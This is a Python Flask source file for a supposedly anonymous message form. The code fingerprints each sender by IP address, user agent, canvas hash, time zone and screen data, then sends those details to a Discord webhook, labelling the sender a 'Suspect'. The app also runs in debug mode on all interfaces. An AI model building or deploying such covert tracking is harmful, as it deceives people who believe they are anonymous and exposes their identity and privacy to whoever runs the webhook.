from flask import Flask, request, render_template
import time
import requests
import json
import logging
import os 

app = Flask(__name__)


DISCORD_WEBHOOK_URL = os.environ.get("DISCORD_WEBHOOK_URL")

logging.basicConfig(level=logging.INFO)

def send_to_bot(message, ip_address, user_agent, client_fingerprint):
    """Sends a detailed notification to your Discord channel via the webhook."""
    
    
    try:
        fp_data = json.loads(client_fingerprint)
    except json.JSONDecodeError:
        fp_data = {}
    
    
    canvas_hash = fp_data.get('canvas_hash', 'N/A')
    
    
    fields = [
        # Primary Correlation Clues
        {"name": "Timestamp (UTC)", "value": time.strftime("%Y-%m-%d %H:%M:%S UTC", time.gmtime()), "inline": False},
        {"name": "Suspect IP", "value": ip_address, "inline": True},
        {"name": "User Agent (Browser/OS)", "value": user_agent, "inline": True},
        
        # Advanced Fingerprint Data
        {"name": "Time Zone", "value": fp_data.get('time_zone', 'N/A'), "inline": True},
        {"name": "Screen Res/Color", "value": f"{fp_data.get('screen_res', 'N/A')} ({fp_data.get('color_depth', 'N/A')}bit)", "inline": True},
        
        # The MOST UNIQUE HASH 
        {"name": "Canvas Hash (Unique ID)", "value": canvas_hash[:40] + '...', "inline": False} 
    ]
    
    payload = {
        "content": f"🚨 **Message Received!** 🤯",
        "embeds": [
            {
                "title": f"New Secret Message",
                "description": message,
                "fields": fields,
                "color": 16711680 
            }
        ]
    }
    
    try:
        requests.post(DISCORD_WEBHOOK_URL, json=payload)
        logging.info(f"Message received and sent to webhook for IP: {ip_address}")
    except Exception as e:
        logging.error(f"Failed to send webhook: {e}")


@app.route('/', methods=['GET', 'POST'])
def anon_msg_form():
    """Handles submission, captures ALL data, and notifies the bot."""
    
    if request.method == 'POST':
        
        message = request.form.get('message')
        
        client_fingerprint = request.form.get('fingerprint_data') 
        
        # Server-side data
        ip_address = request.headers.get('X-Forwarded-For', request.remote_addr)
        user_agent = request.headers.get('User-Agent')
        
        if message and client_fingerprint:
            
            send_to_bot(message, ip_address, user_agent, client_fingerprint)
            
            
            return render_template('success.html')
        
        return "Error: Message or Fingerprint data missing.", 400

    
    return render_template('submit_form.html')


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)